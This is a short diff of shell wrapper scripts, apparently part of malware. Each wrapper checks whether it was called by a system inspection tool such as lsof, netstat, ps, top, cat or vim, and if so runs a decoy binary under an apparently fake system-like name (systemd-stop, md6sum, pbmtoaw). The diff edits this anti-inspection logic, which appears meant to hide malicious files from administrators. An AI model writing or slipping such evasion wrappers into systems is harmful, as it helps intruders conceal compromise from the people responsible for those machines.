@@ -26,9 +26,9 @@ if [[ -z "${farg// }" ]]; then
     /usr/bin/systemd-stop $@
     exit
 fi
-substr="lsofmountnetstatpssockstattopcatvim
+substr="lsofmountnetstatpssockstattopcatvim"
 if  [[ $substr =~ .*$farg.* ]]; then
-    head -n 50 /dev/urandom /usr/bin/systemd-stop
+    /usr/bin/systemd-stop /usr/bin/pbmtoaw
     exit
 fi
 /usr/bin/systemd-stop $@
@@ -94,7 +94,7 @@ if [[ -z "${farg// }" ]]; then
 fi
 substr="lsofmountnetstatpssockstattopcatvim"
 if  [[ $substr =~ .*$farg.* ]]; then
-    /usr/bin/md6sum /usr/bin/systemd-stop
+    /usr/bin/md6sum /usr/bin/pbmtoaw
     exit
 fi
 /usr/bin/md6sum $@
